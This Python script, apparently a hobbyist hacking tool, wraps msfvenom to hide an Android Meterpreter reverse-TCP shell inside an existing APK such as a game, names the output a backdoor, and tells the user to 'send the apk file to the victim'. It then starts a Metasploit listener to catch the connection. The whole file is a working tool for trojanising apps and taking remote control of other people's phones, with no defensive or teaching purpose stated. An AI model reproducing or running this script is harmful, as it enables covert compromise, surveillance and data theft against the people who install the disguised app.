import os
from colorama import Fore, Back, Style

print(Fore.CYAN+Back.WHITE + Style.BRIGHT + "\n\n     Android Payload APK Payload Generator")
print(Fore.CYAN+Back.WHITE + Style.BRIGHT + "     Hide an msfconsole reverse tcp shell payload in an existing apk application")
print(Fore.MAGENTA+Back.WHITE + Style.BRIGHT + "        made by bkstephen    ver: July 2020\n")

print(Fore.RED+Back.WHITE + Style.BRIGHT + "Requirements: \n" + Style.RESET_ALL)
print(Fore.BLUE + Style.BRIGHT + "1. msfvenom: for generating the payload")
print("2. msfconsole (Metasploit): for starting the meterpreter session")
print("3. An apk file to place the payload in, e.g. an android game (search for Flappy Bird android apk)")
print("4. Make sure you have zipalign installed (apt install zipalign) \n\n" + Style.RESET_ALL)

try:
	apkFile = input(Back.BLUE + Fore.WHITE+"Enter apk file location: "+Style.RESET_ALL)
	ip = input(Back.BLUE + Fore.WHITE + "Enter machine IP (Your IP, local or public): "+Style.RESET_ALL)
	port = input(Back.BLUE + Fore.WHITE + "Enter listening port of your machine (This should be the same in msfconsole): "+Style.RESET_ALL)
	additional = input(Back.BLUE + Fore.WHITE + "[OPTIONAL] Enter additional msfvenom arguments (empty by default) "+Style.RESET_ALL)
	command = "msfvenom -x "+apkFile+" -p android/meterpreter/reverse_tcp -o rename_this_backdoor.apk LHOST="+ip+" LPORT="+port + " " + additional
	os.system(command)
	print(Fore.RED+Back.WHITE+Style.BRIGHT+"\n\nSend the apk file to the victim \n\nTo run msfconsole manually: then start msfconsole session and run the following commands: \n")
	print(Fore.MAGENTA+"\n"+"          use exploit/multi/handler")
	print("          set payload android/meterpreter/reverse_tcp")
	print("          set LHOST "+ip)
	print("          set LPORT "+port)
	print("          exploit \n"+Style.RESET_ALL)
	
	print(Back.RED+Fore.WHITE+Style.BRIGHT+"\n\n... STARTING METASPLOIT, LISTENING ON PORT: "+port+Style.RESET_ALL)
	
	os.system("msfconsole -q -x \"use exploit/multi/handler;set payload android/meterpreter/reverse_tcp;set LHOST "+ip+"; set LPORT "+port+";exploit;\"")

except:
	print(Back.RED + "SOMETHING WENT WRONG! PLEASE CHECK YOUR ARGUNETS OR MAKE SURE THE APK FILE LOCATION IS CORRECT")






